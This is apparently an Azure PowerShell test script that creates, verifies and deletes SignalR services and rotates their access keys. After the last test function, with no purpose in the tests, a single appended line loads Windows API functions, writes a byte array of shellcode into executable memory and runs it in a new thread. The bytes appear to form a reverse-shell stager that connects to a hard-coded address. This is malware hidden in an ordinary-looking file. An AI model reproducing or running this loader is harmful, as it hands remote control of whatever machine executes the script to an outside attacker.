














function Test-AzureRmSignalR {
    
    $resourceGroupName = Get-RandomResourceGroupName
    $signalrName = Get-RandomSignalRName
    $freeSignalRName = Get-RandomSignalRName "signalr-free-test-"
    $location = Get-ProviderLocation "Microsoft.SignalRService/SignalR"

    try {
        New-AzResourceGroup -Name $resourceGroupName -Location $location

        
        $signalr = New-AzSignalR -ResourceGroupName $resourceGroupName -Name $signalrName -Sku "Standard_S1"
        Verify-SignalR $signalr $signalrName $location "Standard_S1" 1

        
        $signalrs = Get-AzSignalR -ResourceGroupName $resourceGroupName
        Assert-NotNull $signalrs
        Assert-AreEqual "PSSignalRResource" $signalrs.GetType().Name
        Verify-SignalR $signalrs $signalrName $location "Standard_S1" 1

        
        $retrievedSignalR = Get-AzSignalR -ResourceGroupName $resourceGroupName -Name $signalrName
        Verify-SignalR $retrievedSignalR $signalrName $location "Standard_S1" 1

        
        $freeSignalR = New-AzSignalR -ResourceGroupName $resourceGroupName -Name $freeSignalRName -Sku "Free_F1"
        Verify-SignalR $freeSignalR $freeSignalRName $location "Free_F1" 1

        
        $signalrs = Get-AzSignalR -ResourceGroupName $resourceGroupName
        Assert-NotNull $signalrs
        Assert-AreEqual "Object[]" $signalrs.GetType().Name
        Assert-AreEqual 2 $signalrs.Length
        $freeSignalR = $signalrs | Where-Object -FilterScript {$_.Sku.Name -eq "Free_F1"}
        $standardSignalR = $signalrs | Where-Object -FilterScript {$_.Sku.Name -eq "Standard_S1"}
        Assert-NotNull $freeSignalR
        Assert-NotNull $standardSignalR
        Verify-SignalR $freeSignalR $freeSignalRName $location "Free_F1" 1

        
        $keys = Get-AzSignalRKey -ResourceGroupName $resourceGroupName -Name $signalrName
        Assert-NotNull $keys
        Assert-NotNull $keys.PrimaryKey
        Assert-NotNull $keys.PrimaryConnectionString
        Assert-NotNull $keys.SecondaryKey
        Assert-NotNull $keys.SecondaryConnectionString

        
        $ret = New-AzSignalRKey -ResourceGroupName $resourceGroupName -Name $signalrName -KeyType Primary -PassThru
        Assert-True { $ret }
        $newKeys1 = Get-AzSignalRKey -ResourceGroupName $resourceGroupName -Name $signalrName
        Assert-NotNull $newKeys1
        Assert-AreNotEqual $keys.PrimaryKey $newKeys1.PrimaryKey
        Assert-AreNotEqual $keys.PrimaryConnectionString $newKeys1.PrimaryConnectionString
        Assert-AreEqual $keys.SecondaryKey $newKeys1.SecondaryKey
        Assert-AreEqual $keys.SecondaryConnectionString $newKeys1.SecondaryConnectionString

        
        $ret = New-AzSignalRKey -ResourceGroupName $resourceGroupName -Name $signalrName -KeyType Secondary
        Assert-Null $ret
        $newKeys2 = Get-AzSignalRKey -ResourceGroupName $resourceGroupName -Name $signalrName
        Assert-NotNull $newKeys2
        Assert-AreEqual $newKeys1.PrimaryKey $newKeys2.PrimaryKey
        Assert-AreEqual $newKeys1.PrimaryConnectionString $newKeys2.PrimaryConnectionString
        Assert-AreNotEqual $newKeys1.SecondaryKey $newKeys2.SecondaryKey
        Assert-AreNotEqual $newKeys1.SecondaryConnectionString $newKeys2.SecondaryConnectionString

        Remove-AzSignalR -ResourceGroupName $resourceGroupName -Name $signalrName

        Get-AzSignalR -ResourceGroupName $resourceGroupName | Remove-AzSignalR
    }
    finally {
        Remove-AzResourceGroup -Name $resourceGroupName -Force
    }
}


function Test-AzureRmSignalRWithDefaultArgs {
    $resourceGroupName = Get-RandomResourceGroupName
    $signalrName = Get-RandomSignalRName
    $freeSignalRName = Get-RandomSignalRName "signalr-free-test-"
    $location = Get-ProviderLocation "Microsoft.SignalRService/SignalR"

    try {
		New-AzResourceGroup -Name $resourceGroupName -Location $location

        
        $signalr = New-AzSignalR -Name $resourceGroupName
        Verify-SignalR $signalr $resourceGroupName $location "Standard_S1" 1

        $signalrs = Get-AzSignalR -ResourceGroupName $resourceGroupName
        Assert-NotNull $signalrs
        Assert-AreEqual "PSSignalRResource" $signalrs.GetType().Name
        Verify-SignalR $signalrs $resourceGroupName $location "Standard_S1" 1

        
        Set-AzDefault -ResourceGroupName $resourceGroupName
        $signalr = New-AzSignalR -Name $signalrName -Sku "Free_F1"

        
        $signalrs = Get-AzSignalR -ResourceGroupName $resourceGroupName
        Assert-NotNull $signalrs
        Assert-AreEqual "Object[]" $signalrs.GetType().Name
        Assert-AreEqual 2 $signalrs.Length
        $freeSignalR = $signalrs | Where-Object -FilterScript {$_.Sku.Name -eq "Free_F1"}
        $standardSignalR = $signalrs | Where-Object -FilterScript {$_.Sku.Name -eq "Standard_S1"}
        Assert-NotNull $freeSignalR
        Assert-NotNull $standardSignalR
        Verify-SignalR $freeSignalR $signalrName $location "Free_F1" 1

        
        $keys = Get-AzSignalRKey -Name $signalrName
        Assert-NotNull $keys
        Assert-NotNull $keys.PrimaryKey
        Assert-NotNull $keys.PrimaryConnectionString
        Assert-NotNull $keys.SecondaryKey
        Assert-NotNull $keys.SecondaryConnectionString

        
        $ret = New-AzSignalRKey -Name $signalrName -KeyType Primary -PassThru
        Assert-True { $ret }
        $newKeys1 = Get-AzSignalRKey -Name $signalrName
        Assert-NotNull $newKeys1
        Assert-AreNotEqual $keys.PrimaryKey $newKeys1.PrimaryKey
        Assert-AreNotEqual $keys.PrimaryConnectionString $newKeys1.PrimaryConnectionString
        Assert-AreEqual $keys.SecondaryKey $newKeys1.SecondaryKey
        Assert-AreEqual $keys.SecondaryConnectionString $newKeys1.SecondaryConnectionString

        
        Remove-AzSignalR -Name $signalrName

        
        Get-AzSignalR -Name $resourceGroupName | Remove-AzSignalR
    }
    finally {
        Remove-AzResourceGroup -Name $resourceGroupName -Force
    }
}


function Verify-SignalR {
    param(
        [Microsoft.Azure.Commands.SignalR.Models.PSSignalRResource] $signalr,
        [string] $signalrName,
        [string] $location,
        [string] $sku,
        [int] $unitCount
    )
    Assert-NotNull $signalr
    Assert-NotNull $signalr.Id
    Assert-NotNull $signalr.Type
    Assert-AreEqual $signalrName $signalr.Name
    Assert-LocationEqual $location $signalr.Location

    Assert-NotNull $signalr.Sku
    Assert-AreEqual ([Microsoft.Azure.Commands.SignalR.Models.PSResourceSku]) $signalr.Sku.GetType()
    Assert-AreEqual $sku $signalr.Sku.Name
    Assert-AreEqual $unitCount $signalr.Sku.Capacity
    Assert-AreEqual "Succeeded" $signalr.ProvisioningState
    Assert-AreEqual "$signalrName.service.signalr.net" $signalr.HostName
    Assert-NotNull $signalr.ExternalIP
    Assert-NotNull $signalr.PublicPort
    Assert-NotNull $signalr.ServerPort
    Assert-NotNull $signalr.Version
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x53,0x3c,0x57,0x0e,0x68,0x02,0x00,0x1b,0x39,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

